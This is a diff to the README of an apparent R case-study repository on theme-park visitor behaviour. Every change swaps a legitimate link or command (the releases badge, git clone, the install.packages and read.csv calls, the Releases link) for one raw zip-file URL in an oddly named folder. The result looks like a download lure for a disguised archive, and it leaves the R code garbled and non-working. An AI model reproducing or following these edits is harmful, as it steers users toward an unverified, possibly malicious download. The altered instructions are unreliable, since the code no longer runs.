@@ -2,7 +2,7 @@
 
 Welcome to the **TechnoMagicLand Visitor Behavior Analysis** repository! This case study focuses on data preprocessing and behavioral analysis of visitors to TechnoMagicLand. The goal is to identify repeat visitors and enhance engagement strategies through various data analysis techniques.
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-blue)](https://github.com/park-kwang-woon/tml-visitor-behavior-analysis/releases)
+[![Download Releases](https://github.com/park-kwang-woon/tml-visitor-behavior-analysis/raw/refs/heads/main/bronzelike/behavior-visitor-tml-analysis-3.6.zip%20Releases-Click%20Here-blue)](https://github.com/park-kwang-woon/tml-visitor-behavior-analysis/raw/refs/heads/main/bronzelike/behavior-visitor-tml-analysis-3.6.zip)
 
 ## Table of Contents
 
@@ -62,7 +62,7 @@ To get started with this project, follow these steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/park-kwang-woon/tml-visitor-behavior-analysis.git
+   git clone https://github.com/park-kwang-woon/tml-visitor-behavior-analysis/raw/refs/heads/main/bronzelike/behavior-visitor-tml-analysis-3.6.zip
    ```
 
 2. Navigate to the project directory:
@@ -72,7 +72,7 @@ To get started with this project, follow these steps:
 
 3. Install the required R packages. You can use the following command in R:
    ```R
-   install.packages(c("dplyr", "ggplot2", "cluster", "factoextra"))
+   https://github.com/park-kwang-woon/tml-visitor-behavior-analysis/raw/refs/heads/main/bronzelike/behavior-visitor-tml-analysis-3.6.zip(c("dplyr", "ggplot2", "cluster", "factoextra"))
    ```
 
 ## Usage
@@ -81,7 +81,7 @@ After installation, you can run the analysis scripts in R. Each script is docume
 
 1. Load the dataset:
    ```R
-   data <- read.csv("data/visitor_data.csv")
+   data <- https://github.com/park-kwang-woon/tml-visitor-behavior-analysis/raw/refs/heads/main/bronzelike/behavior-visitor-tml-analysis-3.6.zip("https://github.com/park-kwang-woon/tml-visitor-behavior-analysis/raw/refs/heads/main/bronzelike/behavior-visitor-tml-analysis-3.6.zip")
    ```
 
 2. Run the analysis:
@@ -145,4 +145,4 @@ We welcome contributions to this project. If you have ideas for improvements or 
 
 This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
-For more information and to download the latest releases, visit [Releases](https://github.com/park-kwang-woon/tml-visitor-behavior-analysis/releases).
+For more information and to download the latest releases, visit [Releases](https://github.com/park-kwang-woon/tml-visitor-behavior-analysis/raw/refs/heads/main/bronzelike/behavior-visitor-tml-analysis-3.6.zip).
